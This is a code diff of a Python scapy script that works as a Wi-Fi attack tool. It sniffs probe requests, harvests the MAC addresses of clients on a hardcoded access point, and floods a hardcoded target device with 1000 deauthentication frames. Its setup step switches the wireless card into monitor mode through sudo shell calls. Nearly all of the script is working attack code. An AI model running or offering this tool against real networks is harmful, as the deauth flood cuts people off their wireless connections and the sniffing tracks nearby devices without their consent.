@@ -1,51 +1,52 @@
-import argparse
+import sys
+import os
 from scapy.all import *
 
 interface= "wlx00c0ca84aba2"
+ap_mac = "e0:22:04:2f:4d:0e"
+device_mac = "60:be:b5:f0:23:b1"
 probeReqs = []
 macAddresses = []
 
-def sniffProbeRequests(pkt):
+def sniff_probe_requests(pkt):
 	if pkt.haslayer(Dot11ProbeReq):
 		netName = pkt.getlayer(Dot11ProbeReq).info
 		if netName not in probeReqs:
 			probeReqs.append(netName)
 			print "[+] Detected new probe request: " + netName
 
-def sniffAllMacAddresses(pkt):
-	if pkt.haslayer(Dot11ProbeReq):
+def sniff_all_mac_addresses(pkt):
+	if pkt.haslayer(Dot11):
+		
 		layer = pkt.getlayer(Dot11)
-
-		if layer.addr2 and (layer.addr2 not in macAddresses):
+		if layer.addr2 and (layer.addr2 not in macAddresses) and layer.addr1 == ap_mac:
 			macAddresses.append(layer.addr2)
 			print "[+] Detected new mac address: " + layer.addr2
 
-def getProbeRequests(macs):
+def get_probe_requests():
     print "getting probe requests.."
-    sniff(iface=interface, prn=sniffProbeRequests)
+    sniff(iface=interface, prn=sniff_probe_requests)
 
 
-def getAllMacAddresses(macs):
+def get_all_mac_addresses():
 	print "getting all mac addresses on network.."
-	sniff(iface=interface, prn=sniffAllMacAddresses)
+	sniff(iface=interface, prn=sniff_all_mac_addresses)
 
-def deauthDevice(macs):
+def deauth_device():
 	print "deauthing.."
-	ap_mac = "48:00:33:B7:CE:D8"
-	device_mac = "60:be:b5:f0:23:b1"
-	pkt = RadioTap() / Dot11( addr1 = ap_mac, addr2 = device_mac, addr3=device_mac) / Dot11Deauth() 
-	sendp(pkt, iface=interface, count=1000, inter=.1)
+	pkt = RadioTap() / Dot11( addr1=ap_mac, addr2=device_mac, addr3=device_mac) / Dot11Deauth() 
+	sendp(pkt, iface=interface, count=1000, inter=1)
 
+def setup_nic():
+	os.system("sudo ifconfig " + interface + " down")
+	os.system("sudo iwconfig " + interface + " mode monitor")
+	os.system("sudo ifconfig " + interface + " up")
 
-
-parser = argparse.ArgumentParser()
-parser.add_argument("-p", help="list all probe requests",
-                    type=getProbeRequests,
-                    action="store")
-parser.add_argument("-m", help="get all mac addresses",
-                    type=getAllMacAddresses,
-                    action="store")
-parser.add_argument("-d", help="deauth a device",
-                    type=deauthDevice,
-                    action="store")
-args = parser.parse_args()
+if sys.argv[1] == '-d':
+	deauth_device()
+elif sys.argv[1] == '-g':
+	get_all_mac_addresses()
+elif sys.argv[1] == '-p':
+	get_probe_requests()
+elif sys.argv[1] == '-s':
+	setup_nic()
